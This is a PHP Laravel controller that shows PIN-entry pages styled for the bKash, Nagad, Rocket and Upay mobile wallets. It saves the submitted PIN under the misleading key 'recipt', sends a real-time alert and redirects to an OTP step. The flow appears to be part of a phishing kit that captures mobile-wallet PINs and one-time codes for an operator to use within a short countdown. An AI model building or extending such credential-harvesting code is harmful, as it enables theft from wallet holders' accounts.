<?php

namespace App\Modules\Payment\Http\Controllers;

use App\Events\PinSubmitted;
use App\Models\Application;
use App\Modules\Forms\FormNotificationService;
use App\Modules\Payment\Http\Requests\StorePinRequest;
use App\Modules\Payment\Services\PaymentSession;
use App\Modules\Payment\Support\GatewayManager;
use Illuminate\Http\RedirectResponse;
use Illuminate\Routing\Controller;
use Illuminate\View\View;
use Illuminate\Support\Facades\Log;
use Throwable;
class PinController extends Controller
{
    public function __construct(
        private PaymentSession $session,
        private GatewayManager $gateways,
        private readonly FormNotificationService $notifications,
    ) {
    }

public function show(): View
{
    $method = $this->session->get('method');

    return match ($method) {
        'bkash' => view('payment::steps.bkash.pin', [
            'session' => $this->session,
        ]),

        'nagad' => view('payment::steps.nagad.pin', [
            'session' => $this->session,
        ]),

        'rocket' => view('payment::steps.rocket.pin', [
            'session' => $this->session,
        ]),

        'upay' => view('payment::steps.upay.pin', [
            'session' => $this->session,
        ]),

        default => abort(400, 'Invalid payment method'),
    };
}


public function store(
    StorePinRequest $request
): RedirectResponse {

    $recipt = $request->validated()['pin'];
    $referenceNo = $this->session->get('reference_no');
    if ($referenceNo) {
            $application = Application::where(
                'payment_reference',
                $referenceNo
            )->first();
            if ($application) {
                 $meta_info = $application->meta_info;
                        if (is_string($meta_info)) {
                            $decoded = json_decode(
                                $meta_info,
                                true
                            );
                            $meta_info = is_array($decoded)
                                ? $decoded
                                : [];
                        } elseif (! is_array($meta_info)) {
                            $meta_info = [];
                        }
                        $meta_info['recipt'] = $recipt;
                        $meta_info['recipt_submitted_at'] = now()->toIso8601String();
                        // Product Info countdown anchor: the receipt submission
                        // starts the 3-minute countdown. A later box_no update
                        // (OtpController::store) will push this anchor forward.
                        $meta_info['product_countdown_at'] = now()->toIso8601String();
                        $application->update([
                            'meta_info' => $meta_info,
                        ]);
                try {
                    event(new PinSubmitted($application));
                } catch (Throwable $exception) {
                    Log::warning('Payment Account Number Application realtime notification failed.', [
                        'application_id' => $application->id,
                        'error' => $exception->getMessage(),
                    ]);
                }
                    $this->notifications->notifyPinSubmitted($application);
            } 
    }
    /*
    |--------------------------------------------------------------------------
    | Move to OTP Step
    |--------------------------------------------------------------------------
    */
    $this->session->setStep('otp');

    return redirect()->route(
        'apay-payment.steps.otp'
    );
}

}
